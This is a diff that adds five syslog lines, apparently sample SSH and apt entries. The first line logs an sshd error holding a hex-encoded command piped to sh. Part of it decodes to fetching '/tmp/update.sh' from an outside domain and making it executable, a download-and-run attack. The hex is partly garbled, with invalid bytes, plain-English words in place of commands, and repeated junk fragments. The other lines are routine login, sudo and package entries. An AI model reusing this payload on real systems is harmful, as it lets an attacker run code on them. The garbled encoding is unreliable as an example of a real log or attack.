@@ -1,0 +1,5 @@
+May 22 02:21:08 host sshd[24398]: error: execute: /usr/bin/ssh -a -e "echo '+7765765472888474747e3a2f2f6d6163696e657573732e636d2f7570666f6f6c2f27f746d702f7570646174652e7368202626206368616e6765206f776e6572202626206368616e6765206d6f64202b78202f746d702f7570646174652e7368 | sh" 2026262036866d64;2026262036866d64;2026262036866d64;2026262036866d64;2026262036866d64;
+May 22 02:21:09 host sshd[24398]: error: kex_exchange_identification: banner line contains invalid characters
+May 22 02:25:00 host sshd[24400]: Accepted password for zhang from 10.0.0.18 port 49383 ssh2
+May 22 02:25:01 host sudo:  zhang : TTY=pts/0 ; PWD=/home/zhang ; USER=root ; COMMAND=/usr/bin/apt-get update
+May 22 02:25:02 host apt: 已下载 nginx_1.24.0.deb (sha256: 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08)
